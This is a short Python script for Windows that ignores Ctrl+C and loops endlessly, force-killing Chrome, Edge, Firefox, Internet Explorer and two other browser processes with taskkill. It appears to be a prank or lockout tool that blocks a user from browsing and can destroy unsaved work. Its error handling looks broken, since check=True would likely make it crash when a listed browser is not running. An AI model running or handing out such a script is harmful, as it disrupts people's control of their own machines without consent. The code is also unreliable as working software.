from signal import signal, SIGINT, SIG_IGN
import subprocess
signal(SIGINT, SIG_IGN)
while True:
  subprocess.run(["taskkill","/f","/im","chrome.exe"], check=True)
  subprocess.run(["taskkill","/f","/im","msedge.exe"], check=True)
  subprocess.run(["taskkill","/f","/im","plasmafox.exe"], check=True)
  subprocess.run(["taskkill","/f","/im","firefox.exe"], check=True)
  subprocess.run(["taskkill","/f","/im","iexplore.exe"], check=True)
  subprocess.run(["taskkill","/f","/im","r3dfox.exe"], check=True)
